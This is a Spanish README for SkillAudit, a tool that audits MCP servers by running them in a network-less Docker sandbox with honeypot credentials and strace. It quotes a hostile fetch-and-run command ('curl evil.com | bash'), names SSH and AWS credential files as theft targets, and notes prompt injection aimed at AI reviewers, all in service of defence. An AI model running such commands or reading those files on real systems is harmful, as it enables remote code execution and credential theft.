# SkillAudit 🔍

> **Sandbox de seguridad para MCP servers y skills de IA.**  
> Un MCP server que audita otros MCP servers (Node.js y Python) — ejecutándolos en Docker aislado y observando su comportamiento real.

---

## ¿Qué problema resuelve?

Los MCP servers le dan capacidades a los agentes de IA: leer archivos, hacer requests, ejecutar comandos. Cualquiera puede publicar uno. Un MCP server malicioso puede:

- Robar credenciales (`~/.aws/credentials`, `~/.ssh/id_rsa`)
- Exfiltrar datos a servidores externos
- Ejecutar código remoto (`curl evil.com | bash`)
- Acceder a cosas que no declaró que haría

Revisar el código fuente no es confiable — puede incluir **prompt injection** para engañar a la IA revisora.

## La solución: observar comportamiento, no leer código

En su versión MCP Server, SkillAudit **delega el análisis a tu propio agente** (Gemini, Claude, Cursor). El servidor Python solo corre el Docker y captura los logs crudos. 

```
Gemini CLI / Claude Desktop
└── "auditá @some/mcp-server antes de instalarlo"
        ├── Llama a get_package_metadata() para leer el README
        ├── El LLM (Gemini) inventa test cases maliciosos y edge cases
        ├── Llama a run_package_tests() para correrlos en Docker
        │       └── Sandbox sin red + honeypots + strace
        ├── Gemini recibe los logs crudos (syscalls, procesos, red)
        └── Gemini analiza si el comportamiento coincide con la descripción
```

---

## Instalación

**Requisitos:** Python 3.10+, Docker, npm

```bash
git clone <repo>
cd skillaudit

# Entorno virtual
python3 -m venv .venv
source .venv/bin/activate

# Instalar dependencias puras (sin SDKs de IA pesados)
pip install -e .

# Imagen Docker del sandbox
DOCKER_BUILDKIT=0 docker build -t skillaudit-sandbox:latest ./sandbox/
```

---

## Uso como MCP Server ⭐

Configurá `skillaudit-mcp` en tu agente. **No necesitás pasarle API keys**, tu plan de Gemini Pro hace todo el análisis localmente.

### Gemini CLI / Claude Desktop

```json
{
  "mcpServers": {
    "skillaudit": {
      "command": "/ruta/a/skillaudit/.venv/bin/skillaudit-mcp"
    }
  }
}
```

### Tools disponibles

| Tool | Descripción |
|---|---|
| `get_package_metadata(package_name)` | Descarga el package y extrae README y schema de commands |
| `run_package_tests(package_name, test_scenarios)` | Ejecuta los tests de Gemini en Docker y devuelve los logs de strace |
| `check_docker_status()` | Verifica que Docker y la imagen estén listos |

### Ejemplo de conversación

```
Tú:     "Auditemos @some/mcp-server para ver si es seguro."

Gemini: [Llama a get_package_metadata("@some/mcp-server")]
Gemini: "Veo que es un parser de CSV. Voy a probar leer un archivo normal 
         y también voy a intentar leer tus credenciales de AWS."
Gemini: [Llama a run_package_tests con escenarios normales y maliciosos]

Gemini: "¡ALERTA! El package intentó leer /root/.aws/credentials (honeypot) 
         y luego intentó hacer un request a 45.33.22.11. 
         No recomiendo instalarlo, su comportamiento no coincide con su descripción."
```

---

## Cómo funciona el sandbox

| Característica | Detalle |
|---|---|
| 🚫 Red | `--network none` — sin internet |
| 🍯 Honeypots | Credenciales falsas en `~/.aws` y `~/.ssh` |
| 👁️ strace | Captura cada syscall (filesystem, procesos, red) |
| 🕵️‍♂️ Multilenguaje | Soporte para Node.js (NPM) y Python (PyPI) |
| 🛡️ Aislamiento | Ejecución sin privilegios (`no-new-privileges`) |
| 🔍 Discovery | Descubrimiento dinámico de tools vía MCP handshake |
| 🔒 Recursos | 50% CPU, 256 MB RAM |
| 🤖 IA #1 | Genera test cases realistas desde la descripción |
| 🧠 IA #2 | Compara comportamiento declarado vs real |

---

## Uso como CLI (alternativo)

```bash
source .venv/bin/activate
export GEMINI_API_KEY=<tu_key>

skillaudit test @modelcontextprotocol/server-filesystem
skillaudit test @some/mcp-server --output-dir ./reports --verbose
```

---

## Variables de entorno

| Variable | Default | Descripción |
|---|---|---|
| `GEMINI_API_KEY` | — | API key de Google Gemini |
| `OPENAI_API_KEY` | — | API key de OpenAI |
| `ANTHROPIC_API_KEY` | — | API key de Anthropic |
| `SKILLAUDIT_AI_PROVIDER` | `gemini` | Proveedor (`gemini`, `openai`, `anthropic`) |
| `SKILLAUDIT_RISK_THRESHOLD` | `70` | Score mínimo para recomendar no instalar |
| `SKILLAUDIT_TIMEOUT` | `120` | Timeout del sandbox en segundos |

---

## ¿Por qué no simplemente leer el código?

- El código puede usar **prompt injection** para engañar a la IA revisora
- La lógica maliciosa puede activarse solo bajo ciertas condiciones
- El comportamiento real puede diferir del código visible (supply chain attacks)

**Observar comportamiento es objetivamente más confiable que analizar código estático.**
